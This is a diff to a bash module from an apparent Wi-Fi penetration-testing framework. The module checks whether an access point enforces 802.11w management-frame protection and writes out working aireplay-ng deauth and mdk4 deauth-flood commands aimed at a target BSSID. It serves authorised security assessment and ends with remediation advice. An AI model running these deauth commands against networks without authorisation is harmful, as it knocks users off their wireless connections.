@@ -1,4 +1,17 @@
 #!/usr/bin/env bash
+# MODULE_META
+# NAME="Deauth Resilience (802.11w/MFP)"
+# CATEGORY="E"
+# DEPS="A1"
+# CRITICAL="no"
+# TOOLS="aireplay-ng,mdk4"
+# DESC="Test 802.11w MFP protection and deauthentication attack resilience"
+# REQS="monitor_iface,target_ssid,target_bssid,target_channel"
+# PCAP="yes"
+# DECODE="wifi_mgmt"
+
+set -uo pipefail
+
 #===============================================================================
 #  modules/e3_deauth_resilience.sh
 #  E3: Deauthentication Resilience (802.11w / MFP)
@@ -32,7 +45,8 @@ run_e3() {
     log_step 1 $total_steps "Verifying tools"
     update_tc_progress 1 $total_steps "Checking"
 
-    
+    check_module_dependencies "E3" || return 1
+
     local has_mdk4=false
     local has_aireplay=false
     local has_tshark=false
@@ -42,8 +56,7 @@ run_e3() {
     command -v tshark &>/dev/null && has_tshark=true
 
     if [[ "$has_mdk4" == "false" && "$has_aireplay" == "false" ]]; then
-        log_error "Either ${TOOL_PATHS[mdk4]} or ${TOOL_PATHS[aireplay-ng]} is required."
-        log_error "Install: apt install -y ${TOOL_PATHS[mdk4]} aircrack-ng"
+        log_error "Either mdk4 or aireplay-ng is required."
         return 1
     fi
 
@@ -66,7 +79,7 @@ run_e3() {
     echo "  ║  This test will:                                                   ║"
     echo "  ║    • Check if AP advertises 802.11w (MFP) protection              ║"
     echo "  ║    • Send deauth frames to test if clients get disconnected       ║"
-    echo "  ║    • Optionally test broadcast deauth flood (with ${TOOL_PATHS[mdk4]})           ║"
+    echo "  ║    • Optionally test broadcast deauth flood (with mdk4)           ║"
     echo "  ║                                                                    ║"
     echo "  ║  This WILL temporarily disrupt clients if MFP is not enabled.    ║"
     echo "  ╚════════════════════════════════════════════════════════════════════╝"
@@ -115,14 +128,15 @@ run_e3() {
 
     if [[ "$has_tshark" == "true" ]]; then
         # Capture a few beacons and check RSN capabilities
-        local beacon_pcap="/tmp/e3_beacon.pcap"
-        timeout 10 ${TOOL_PATHS[tcpdump]} -i "$mon_iface" -c 20 -w "$beacon_pcap" \
+        local beacon_pcap="$TMP_DIR/e3_beacon.pcap"
+        timeout 10 run_fg "tcpdump" -i "$mon_iface" -c 20 -w "$beacon_pcap" \
             "type mgt subtype beacon and ether src ${GUEST_BSSID}" &>/dev/null || true
 
         if [[ -f "$beacon_pcap" && -s "$beacon_pcap" ]]; then
+            ensure_user_ownership "$beacon_pcap"
             # Check for RSN capabilities — MFP bits
             local rsn_caps
-            local rsn_caps=$(${TOOL_PATHS[tshark]} -r "$beacon_pcap" \
+            local rsn_caps=$(run_as_user tshark -r "$beacon_pcap" \
                 -Y "wlan.bssid == ${GUEST_BSSID}" \
                 -T fields \
                 -e wlan.rsn.capabilities \
@@ -138,7 +152,7 @@ run_e3() {
                 echo "RSN Capabilities: ${rsn_caps}" >> "$beacon_file"
 
                 if [[ "$mfpc" == "1" ]]; then
-                    local mfp_advertised="true"
+                    mfp_advertised="true"
                     echo "802.11w MFP Capable: YES" >> "$beacon_file"
                     log_success "AP advertises 802.11w MFP support (capable)"
                 else
@@ -147,7 +161,7 @@ run_e3() {
                 fi
 
                 if [[ "$mfpr" == "1" ]]; then
-                    local mfp_required="true"
+                    mfp_required="true"
                     echo "802.11w MFP Required: YES" >> "$beacon_file"
                     log_success "AP REQUIRES 802.11w MFP (strongest protection)"
                 else
@@ -160,7 +174,7 @@ run_e3() {
 
             # Also check encryption type
             local encryption
-            local encryption=$(${TOOL_PATHS[tshark]} -r "$beacon_pcap" \
+            local encryption=$(run_as_user tshark -r "$beacon_pcap" \
                 -Y "wlan.bssid == ${GUEST_BSSID}" \
                 -T fields \
                 -e wlan.rsn.akms.type \
@@ -172,13 +186,13 @@ run_e3() {
             if echo "$encryption" | grep -q "8"; then
                 echo "WPA3-SAE Detected: YES" >> "$beacon_file"
                 log_success "WPA3-SAE detected — includes built-in MFP"
-                local mfp_advertised="true"
+                mfp_advertised="true"
             fi
         fi
         rm -f "$beacon_pcap"
     else
-        log_info "${TOOL_PATHS[tshark]} not available — skipping detailed beacon analysis"
-        echo "NOTE: ${TOOL_PATHS[tshark]} not available for beacon analysis" >> "$beacon_file"
+        log_info "tshark not available — skipping detailed beacon analysis"
+        echo "NOTE: tshark not available for beacon analysis" >> "$beacon_file"
     fi
 
     #--- Step 3: Pre-test connectivity baseline ---
@@ -189,17 +203,15 @@ run_e3() {
 
     # Monitor for deauth responses and client disconnections
     local deauth_pcap="${evidence_prefix}_deauth_capture.pcap"
-    ${TOOL_PATHS[tcpdump]} -i "$mon_iface" -w "$deauth_pcap" \
-        "type mgt subtype deauth or type mgt subtype disassoc or type mgt subtype probe-req" \
-        &>/dev/null &
-    local tcpdump_pid=$!
-    register_cleanup "kill -SIGINT $tcpdump_pid 2>/dev/null || true; wait $tcpdump_pid 2>/dev/null || true"
+    spawn_bg "e3_tcpdump" "tcpdump" -i "$mon_iface" -w "$deauth_pcap" \
+        "type mgt subtype deauth or type mgt subtype disassoc or type mgt subtype probe-req"
 
     # Count baseline probe requests (10 seconds)
     sleep 10
     local baseline_probes=0
     if [[ "$has_tshark" == "true" ]]; then
-        local baseline_probes=$(${TOOL_PATHS[tshark]} -r "$deauth_pcap" -Y "wlan.fc.type_subtype == 0x04" 2>/dev/null | wc -l) || true
+        ensure_user_ownership "$deauth_pcap"
+        baseline_probes=$(run_as_user tshark -r "$deauth_pcap" -Y "wlan.fc.type_subtype == 0x04" 2>/dev/null | wc -l || true)
     fi
 
     #--- Step 4: Deauth attack ---
@@ -208,31 +220,44 @@ run_e3() {
 
     check_abort || return 1
 
-    if [[ "$has_aireplay" == "true" ]]; then
-        local deauth_method="${TOOL_PATHS[aireplay-ng]}"
-        log_cmd "${TOOL_PATHS[aireplay-ng]} --deauth 20 -a ${GUEST_BSSID} ${mon_iface}"
-
-        # Send targeted deauth
-        ${TOOL_PATHS[aireplay-ng]} --deauth 20 -a "$GUEST_BSSID" "$mon_iface" &>/dev/null || true
-        echo "Sent 20 targeted deauth frames via ${TOOL_PATHS[aireplay-ng]}" >> "$findings_file"
-
-        sleep 5
-
-        # Send broadcast deauth
-        ${TOOL_PATHS[aireplay-ng]} --deauth 10 -a "$GUEST_BSSID" "$mon_iface" &>/dev/null || true
-        echo "Sent 10 broadcast deauth frames via ${TOOL_PATHS[aireplay-ng]}" >> "$findings_file"
+    local can_inject=false
+    if [[ "${HW_CAN_INJECT:-no}" == "yes" ]]; then
+        can_inject=true
+    else
+        log_info "Verifying hardware injection capability..."
+        if validate_injection "$mon_iface"; then
+            can_inject=true
+            HW_CAN_INJECT="yes"
+        fi
     fi
 
-    if [[ "$has_mdk4" == "true" ]]; then
-        local deauth_method="${deauth_method:+${deauth_method}+}${TOOL_PATHS[mdk4]}"
+    if [[ "$can_inject" == "true" ]]; then
+        if [[ "$has_aireplay" == "true" ]]; then
+            deauth_method="aireplay-ng"
+            # Send targeted deauth
+            run_fg "aireplay-ng" --deauth 20 -a "$GUEST_BSSID" "$mon_iface" &>/dev/null || true
+            echo "Sent 20 targeted deauth frames via aireplay-ng" >> "$findings_file"
 
-        # ${TOOL_PATHS[mdk4]} deauth mode — brief burst
-        log_cmd "${TOOL_PATHS[mdk4]} ${mon_iface} d -B ${GUEST_BSSID} -c ${GUEST_CHANNEL:-0}"
-        timeout 15 ${TOOL_PATHS[mdk4]} "$mon_iface" d \
-            -B "$GUEST_BSSID" \
-            -c "${GUEST_CHANNEL:-0}" &>/dev/null || true
+            sleep 5
 
-        echo "Ran ${TOOL_PATHS[mdk4]} deauth flood for 15 seconds" >> "$findings_file"
+            # Send broadcast deauth
+            run_fg "aireplay-ng" --deauth 10 -a "$GUEST_BSSID" "$mon_iface" &>/dev/null || true
+            echo "Sent 10 broadcast deauth frames via aireplay-ng" >> "$findings_file"
+        fi
+
+        if [[ "$has_mdk4" == "true" ]]; then
+            deauth_method="${deauth_method:+${deauth_method}+}mdk4"
+
+            # mdk4 deauth mode — brief burst
+            timeout 15 run_fg "mdk4" "$mon_iface" d \
+                -B "$GUEST_BSSID" \
+                -c "${GUEST_CHANNEL:-0}" &>/dev/null || true
+
+            echo "Ran mdk4 deauth flood for 15 seconds" >> "$findings_file"
+        fi
+    else
+        log_warn "Hardware injection not available. Cannot perform active deauthentication test."
+        echo "SKIPPED: Active testing skipped due to hardware injection limitations." >> "$findings_file"
     fi
 
     #--- Step 5: Measure impact ---
@@ -245,22 +270,23 @@ run_e3() {
     stop_countdown
 
     # Stop capture
-    
+    stop_process "e3_tcpdump"
     validate_pcap "$deauth_pcap" "Deauth test capture"
 
     # Analyze the capture
     if [[ "$has_tshark" == "true" && -f "$deauth_pcap" ]]; then
+        ensure_user_ownership "$deauth_pcap"
         # Count post-deauth probe requests (indicate clients disconnected and are searching)
         local post_probes
-        local post_probes=$(${TOOL_PATHS[tshark]} -r "$deauth_pcap" -Y "wlan.fc.type_subtype == 0x04" 2>/dev/null | wc -l) || true
-        local post_probes=${post_probes:-0}
+        post_probes=$(run_as_user tshark -r "$deauth_pcap" -Y "wlan.fc.type_subtype == 0x04" 2>/dev/null | wc -l) || true
+        post_probes=${post_probes:-0}
 
         # Count deauth frames seen (from AP — could be countermeasure)
         local deauth_from_ap
-        local deauth_from_ap=$(${TOOL_PATHS[tshark]} -r "$deauth_pcap" \
+        deauth_from_ap=$(run_as_user tshark -r "$deauth_pcap" \
             -Y "wlan.fc.type_subtype == 0x0c and wlan.sa == ${GUEST_BSSID}" \
             2>/dev/null | wc -l) || true
-        local deauth_from_ap=${deauth_from_ap:-0}
+        deauth_from_ap=${deauth_from_ap:-0}
 
         echo "" >> "$findings_file"
         echo "Post-attack analysis:" >> "$findings_file"
@@ -270,7 +296,7 @@ run_e3() {
 
         # If probe requests spiked after deauth, clients were affected
         if [[ $post_probes -gt $((baseline_probes + 5)) ]]; then
-            local deauth_effective="true"
+            deauth_effective="true"
             log_result "FINDING" "Deauth attack was effective — client probe requests spiked (${baseline_probes} → ${post_probes})"
             echo "FINDING: Deauth effective — probe request spike detected" >> "$findings_file"
         else
@@ -292,36 +318,36 @@ run_e3() {
     local recommendations=""
 
     if [[ "$mfp_required" == "true" && "$deauth_effective" == "false" ]]; then
-        local result_summary="Network is protected against deauthentication attacks. 802.11w MFP is required and deauth frames were ineffective."
-        local recommendations="No action needed. MFP is properly configured."
+        result_summary="Network is protected against deauthentication attacks. 802.11w MFP is required and deauth frames were ineffective."
+        recommendations="No action needed. MFP is properly configured."
     elif [[ "$mfp_advertised" == "true" && "$deauth_effective" == "false" ]]; then
-        local result_summary="Network appears resilient to deauth attacks. 802.11w MFP is advertised (optional) and deauths were not effective."
-        local recommendations="Consider making MFP required (not optional) for maximum protection."
+        result_summary="Network appears resilient to deauth attacks. 802.11w MFP is advertised (optional) and deauths were not effective."
+        recommendations="Consider making MFP required (not optional) for maximum protection."
     elif [[ "$deauth_effective" == "true" ]]; then
-        local result_status="FINDING"
+        result_status="FINDING"
         if [[ "$mfp_advertised" == "true" ]]; then
-            local result_summary="Deauthentication attacks are effective despite 802.11w MFP being advertised. MFP may be optional and not enforced by all clients."
-            local recommendations="1) Set 802.11w MFP to REQUIRED (not optional). "
+            result_summary="Deauthentication attacks are effective despite 802.11w MFP being advertised. MFP may be optional and not enforced by all clients."
+            recommendations="1) Set 802.11w MFP to REQUIRED (not optional). "
             recommendations+="2) Upgrade clients that do not support MFP. "
             recommendations+="3) Deploy WIDS to detect deauthentication floods."
         else
-            local result_summary="Network is VULNERABLE to deauthentication attacks. 802.11w MFP is NOT enabled. Clients can be disconnected at will."
-            local recommendations="1) Enable 802.11w (MFP / PMF) on all SSIDs — set to REQUIRED. "
+            result_summary="Network is VULNERABLE to deauthentication attacks. 802.11w MFP is NOT enabled. Clients can be disconnected at will."
+            recommendations="1) Enable 802.11w (MFP / PMF) on all SSIDs — set to REQUIRED. "
             recommendations+="2) Consider upgrading to WPA3-SAE which mandates MFP. "
             recommendations+="3) Deploy WIDS/WIPS to detect and alert on deauthentication floods. "
             recommendations+="4) Ensure all client devices support 802.11w."
         fi
     else
-        local result_summary="802.11w MFP is not advertised, but deauth effectiveness could not be confirmed. Manual verification recommended."
-        local recommendations="Enable 802.11w MFP and re-test."
+        result_summary="802.11w MFP is not advertised, but deauth effectiveness could not be confirmed. Manual verification recommended."
+        recommendations="Enable 802.11w MFP and re-test."
     fi
 
-    local result_json
-    evidence_register_file "e3_beacon_analysis.txt"
-    evidence_register_file "e3_deauth_capture.pcap"
-    evidence_register_file "e3_findings.txt"
+    evidence_register_file "$beacon_file"
+    evidence_register_file "$deauth_pcap"
+    evidence_register_file "$findings_file"
 
-    local result_json=$(${TOOL_PATHS[jq]} -n \
+    local result_json
+    result_json=$(run_fg "jq" -n \
         --arg status "$result_status" \
         --arg summary "$result_summary" \
         --arg details "MFP advertised: ${mfp_advertised}, MFP required: ${mfp_required}, Deauth effective: ${deauth_effective}, Method: ${deauth_method}" \
@@ -338,10 +364,20 @@ run_e3() {
             mfp_advertised: ($mfp_advertised == "true"),
             mfp_required: ($mfp_required == "true"),
             deauth_effective: ($deauth_effective == "true"),
-            deauth_method: $deauth_method,
-                    }')
+            deauth_method: $deauth_method
+        }')
 
-    save_tc_result "E3" "$result_json"
+    local has_tool_output=0
+    [[ -f "$findings_file" || -f "$beacon_file" ]] && has_tool_output=1
+
+    local has_primary=0
+    [[ -f "$deauth_pcap" ]] && has_primary=1
+
+    local is_secure_claim=0
+    [[ "$result_status" == "SECURE" ]] && is_secure_claim=1
+
+    save_tc_result "E3" "$result_json" 1 $has_tool_output $has_primary 1 1 1 0 1 1 1 $is_secure_claim
+    save_session_state
 
     # Display summary
     echo ""
